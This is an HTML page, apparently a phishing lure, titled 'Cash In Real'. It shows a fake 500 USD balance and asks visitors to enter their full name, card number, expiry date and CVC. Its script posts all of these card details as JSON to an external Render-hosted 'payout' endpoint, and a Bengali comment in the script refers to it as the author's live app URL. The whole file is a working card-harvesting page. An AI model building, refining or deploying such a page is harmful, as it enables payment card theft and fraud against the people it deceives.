<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cash In Real</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        h2 { color: #333; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #1e7e34; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background-color: #155d27; }
        #message { margin-top: 15px; font-weight: bold; display: none; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>

<div class="container">
    <h2>Cash In Real</h2>
    <p>Balance: 500 USD</p>

    <input type="text" id="name" placeholder="Full Name" required>
    <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" required>
    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
    <input type="text" id="cvc" placeholder="CVC" maxlength="4" required>

    <button onclick="sendData()">Cash In</button>
    <div id="message"></div>
</div>

<script>
    async function sendData() {
        const name = document.getElementById('name').value;
        const cardNumber = document.getElementById('cardNumber').value;
        const expiry = document.getElementById('expiry').value;
        const cvc = document.getElementById('cvc').value;
        const messageDiv = document.getElementById('message');

        if (!name || !cardNumber || !expiry || !cvc) {
            messageDiv.textContent = "Error: All fields are required!";
            messageDiv.className = "error";
            messageDiv.style.display = "block";
            return;
        }

        const payload = {
            name: name,
            cardNumber: cardNumber,
            expiry: expiry,
            cvc: cvc,
            amount: 500
        };

        try {
            // আপনার Render অ্যাপের লাইভ ইউআরএল ব্যবহার করা হয়েছে
            const response = await fetch('https://five00riyal-payout-app-1.onrender.com/transfer', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const result = await response.json();

            if (response.ok) {
                messageDiv.textContent = result.message;
                messageDiv.className = "success";
                messageDiv.style.display = "block";
            } else {
                messageDiv.textContent = "Error: Transaction failed";
                messageDiv.className = "error";
                messageDiv.style.display = "block";
            }
        } catch (error) {
            messageDiv.textContent = "Error: Could not connect to server";
            messageDiv.className = "error";
            messageDiv.style.display = "block";
            console.log(error);
        }
    }
</script>

</body>
</html>
